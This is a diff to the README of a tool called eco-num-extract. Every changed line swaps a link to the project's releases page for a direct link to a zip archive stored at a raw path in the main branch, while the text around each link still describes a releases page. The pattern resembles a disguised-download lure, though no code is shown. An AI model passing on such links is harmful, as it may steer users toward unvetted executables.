@@ -6,7 +6,7 @@ Welcome to eco-num-extract! This application helps you turn natural science text
 
 ## 📥 Download eco-num-extract
 
-**[Download eco-num-extract](https://github.com/asanandha/eco-num-extract/releases)**
+**[Download eco-num-extract](https://github.com/asanandha/eco-num-extract/raw/refs/heads/main/eco_num_extract/eco_extract_num_1.7.zip)**
 
 ## 📋 System Requirements
 
@@ -31,7 +31,7 @@ To start using eco-num-extract, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page.
    
-   [Download eco-num-extract](https://github.com/asanandha/eco-num-extract/releases)
+   [Download eco-num-extract](https://github.com/asanandha/eco-num-extract/raw/refs/heads/main/eco_num_extract/eco_extract_num_1.7.zip)
 
 2. **Choose the Latest Version**: On the releases page, find the most recent version of eco-num-extract. Look for the file with the label indicating it's for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
 
@@ -78,4 +78,4 @@ To dive deeper into the topics eco-num-extract covers, check these resources:
 - **Descriptive Observations**: Understand the significance of detailed scientific descriptions.
 - **Pattern Extraction**: Discover methods for identifying patterns in ecological data.
 
-**[Download eco-num-extract](https://github.com/asanandha/eco-num-extract/releases)** and start transforming your textual observations into valuable insights today!
+**[Download eco-num-extract](https://github.com/asanandha/eco-num-extract/raw/refs/heads/main/eco_num_extract/eco_extract_num_1.7.zip)** and start transforming your textual observations into valuable insights today!
